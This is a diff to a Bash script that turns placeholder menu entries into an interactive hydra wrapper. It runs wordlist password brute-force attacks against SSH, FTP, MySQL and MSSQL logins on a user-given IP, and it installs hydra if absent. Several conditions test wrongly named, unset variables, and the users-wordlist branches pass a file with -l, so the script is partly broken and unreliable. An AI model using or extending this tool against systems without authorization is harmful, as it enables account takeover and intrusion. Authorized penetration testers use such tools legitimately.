@@ -21,7 +21,7 @@ read -p "Wordlist location: " wordl
 case $choice in
 
   1)
-    echo -n "Lithuanian"
+    echo  "SSH Bruteforce"
  read -p "Do you know the user(y=1/n=0): " intel
   if [ "$intel" -eq 1 ]
    then
@@ -36,9 +36,9 @@ case $choice in
     ;;
 
   2)
-    echo -n "Romanian"
+    echo  "FTP Bruteforce"
 read -p "Do you know the user(y=1/n=0): " intel_2
- if [ "$intel" -eq 1 ]
+ if [ "$intel2" -eq 1 ]
   then
   read -p "User: " user_2
   hydra -l $user_2 -P $wordl ftp://$ip
@@ -51,14 +51,51 @@ read -p "Do you know the user(y=1/n=0): " intel_2
     ;;
 
   3)
-    echo -n "Italian"
+    echo "MYSQL Bruteforce"
+read -p "Do you know the user(y=1/n=0): " intel_3
+ if [ "$intel3" -eq 1 ]
+  then
+  read -p "User: " user_3
+  hydra -l $user_3 -P $wordl mysql://$ip
+ elif [ "$intel_3" -eq 0 ]
+  then
+  read -p "Users wordlist location: " user_loc3 
+  hydra -l $user_loc3 -P $wordl mysql://$ip
+  fi  
     ;;
 
   4)
-    echo -n "unknown"
+ echo "MSSQL BruteForce"
+read -p "Do you know the user(y=1/n=0): " intel_4
+ if [ "$intel4" -eq 1 ]
+  then
+  read -p "User: " user_4
+  hydra -l $user_4 -P $wordl mssql://$ip
+ elif [ "$intel_4" -eq 0 ]
+  then
+  read -p "Users wordlist location: " user_loc4 
+  hydra -l $user_loc4 -P $wordl mssql://$ip
+  fi  
+
     ;;
+
+
+5)
+;;
+
+6)
+;;
+
+7)
+;;
+
+8)
+;;
+
+
+
 esac
  else
 sudo apt update 
 sudo apt install hydra
-fi     
+fi   
